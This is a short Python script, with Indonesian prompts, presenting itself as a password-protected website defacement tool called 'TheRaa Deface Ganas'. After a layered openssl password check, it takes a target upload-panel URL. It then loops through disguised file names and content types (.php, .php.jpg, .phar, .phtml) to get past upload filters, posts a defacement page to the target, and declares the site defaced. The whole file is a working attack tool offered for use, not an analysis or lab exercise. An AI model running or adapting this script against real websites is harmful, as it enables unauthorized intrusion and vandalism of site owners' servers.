import os
import subprocess
import requests

def multi_decrypt_pbkdf2(file_path):
    with open(file_path, "r") as f:
        data = f.read().strip()

    layers = [
        "theraa5",
        "theraa4",
        "theraa3",
        "theraa2",
        "theraa1"
    ]

    for pw in layers:
        result = subprocess.run(
            [
                "openssl", "enc", "-aes-256-cbc", "-pbkdf2", "-iter", "100000",
                "-d", "-a", "-salt", "-pass", f"pass:{pw}"
            ],
            input=data.encode(),
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL
        )
        data = result.stdout.decode().strip()

    return data

# --- PROSES AWAL ---
print("🚀 TheRaa Deface Ganas — Protected Version")
user_input = input("🔐 Masukkan Password Akses: ")

# Baca password terenkripsi & decrypt
correct_password = multi_decrypt_pbkdf2("password.txt")

if user_input != correct_password:
    print("❌ Password salah. Akses ditolak.")
    exit()

os.system("clear")
print("""
  _______ _          _____             
 |__   __| |        |  __ \            
    | |  | |__   ___| |__) |__ _  __ _ 
    | |  | '_ \ / _ \  _  // _` |/ _` |
    | |  | | | |  __/ | \ \ (_| | (_| |
    |_|  |_| |_|\___|_|  \_\__,_|\__,_|
        Powered by @msptra12 - TheRaa
""")

# --- INPUT TARGET ---
target = input("🌐 Masukkan URL Upload Panel (contoh: https://target.com/upload.php): ").strip()
up_path = input("📂 Masukkan Path File Tampil (contoh: https://target.com/uploads/): ").strip()

# --- FILES UNTUK UPLOAD BYPASS ---
filenames = [
    ("index.html", "text/html"),
    ("index.php", "application/x-php"),
    ("index.php.jpg", "image/jpeg"),
    ("index.phar", "application/octet-stream"),
    ("index.phtml", "application/octet-stream")
]

# --- PROSES UPLOAD ---
success = False
for name, ctype in filenames:
    print(f"⚡ Uploading: {name} ...")
    try:
        files = {
            'file': (name, open("index.html", "rb"), ctype)
        }
        res = requests.post(target, files=files)

        if res.status_code == 200 and "error" not in res.text.lower():
            print(f"✅ Sukses upload: {up_path}{name}")
            success = True
            break
        else:
            print("❌ Upload gagal / diblokir.")
    except Exception as e:
        print(f"⚠️ Error: {e}")

if not success:
    print("😔 Gagal semua percobaan. Web aman atau filter ketat.")
else:
    print("🎯 Web berhasil dideface! Screenshot sekarang sebelum hilang!")
